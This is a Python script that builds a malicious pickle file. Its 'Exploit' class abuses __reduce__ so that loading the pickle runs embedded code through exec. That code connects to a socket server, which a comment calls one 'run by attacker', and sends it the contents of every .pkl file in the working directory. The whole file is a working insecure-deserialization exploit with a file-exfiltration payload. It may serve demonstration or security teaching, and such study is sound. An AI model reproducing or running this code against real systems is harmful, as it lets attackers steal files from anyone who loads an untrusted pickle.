import pickle

#connects to server and sends .pkl file data
src = """
import socket
import os

HOST = 'localhost'
PORT = 12345
CHUNK = 4096

def start():

    #list all files in local directory
    local_files = os.listdir()

    #create a client socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            #connect to server run by attacker
            client_socket.connect((HOST,PORT))

            #check each file, only open and send data if file is a .pkl file
            for file in local_files:
                if (file.endswith(".pkl")):
                    with open(file, "rb") as f:
                        #read and send file data in chunks
                        while True:
                            data = f.read(CHUNK)

                            client_socket.send(data) #no need to encode, since data is already a bytestring

                            response = client_socket.recv(1024).decode() #expect acknowledgement from server
                            #print(f"server response: {response}")
                            #stop reading if size of data is less than chunk size (eof reached)
                            if (len(data) < CHUNK):
                                print("eof")
                                break

        except Exception as e:
            print("Error:", e)
        
start()
"""

class Exploit:
    def __reduce__(self):
        #needed to get exec() to use imported modules, uses dict as modules could not be reduced
        bdict = __builtins__.__dict__.copy()

        #__orig_import__ required by pyside6, made part of the builtins dict
        if "__orig_import__" not in bdict:
            bdict["__orig_import__"] = bdict.get("__import__")

        #reduce exec w/ code and modules (as a dict) supplied as parameters
        return (exec, (src, bdict,))

if __name__ == "__main__":
    payload = pickle.dumps(Exploit())

    with open("malicious.pkl", "wb") as f:
        f.write(payload)

    print("Malicious pickle written to file.")